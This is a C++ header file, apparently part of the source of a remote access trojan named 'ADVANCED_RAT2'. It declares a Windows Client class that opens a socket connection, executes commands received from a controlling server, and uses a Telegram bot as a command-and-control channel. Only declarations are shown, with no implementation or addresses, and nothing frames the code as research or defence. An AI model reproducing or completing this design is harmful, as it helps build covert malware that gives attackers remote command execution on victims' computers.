#define WIN32_LEAN_AND_MEAN


#ifndef ADVANCED_RAT2_CONNECTION_H
#define ADVANCED_RAT2_CONNECTION_H


#include <iostream>
#include <string>
#include <cstring>
#include <vector>
#include <memory>
#include <fstream>
#include <WS2tcpip.h>
#include <windows.h>
#include<algorithm>
#include <tgbot/tgbot.h>

#define BufferSize 1024

#pragma warning(disable:4996)
#pragma comment (lib, "Ws2_32.lib")

using namespace std;

class Client {
    string ip;
    int port;
    unique_ptr<TgBot::Bot> bot;
    int64_t chatId;
    SOCKET sock;


public:
    //Initialize the telegram bot
    Client();

    //Getting command from the server
    string exec(string& cmd);

    //Creating the connection
    void connection();

    //Getting messages from the server in telegram via the bot
    string getTGMessage(unique_ptr<TgBot::Bot> &bot);

    //Sending command to the server in telegram via the bot
    void sendTGMessage(unique_ptr<TgBot::Bot> &bot, string message);


};


#endif //ADVANCED_RAT2_CONNECTION_H